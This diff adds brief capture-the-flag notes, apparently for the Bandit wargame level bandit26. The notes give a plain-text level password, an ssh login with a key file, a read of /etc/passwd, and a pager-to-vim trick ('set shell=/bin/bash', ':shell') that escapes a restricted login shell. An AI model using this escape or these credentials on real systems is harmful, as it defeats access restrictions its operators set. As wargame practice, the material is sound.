@@ -1,0 +1,12 @@
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+Commands Used:
+
+ssh bandit26@localhost -i bandit26.sshkey
+cat /etc/passwd | grep bandit26
+cat /usr/bin/showtext
+man more
+:set shell=/bin/bash
+:shell
+
+You have to activate more bin/bash by entering VISUAL when you trigger more as you ssh to bandit26
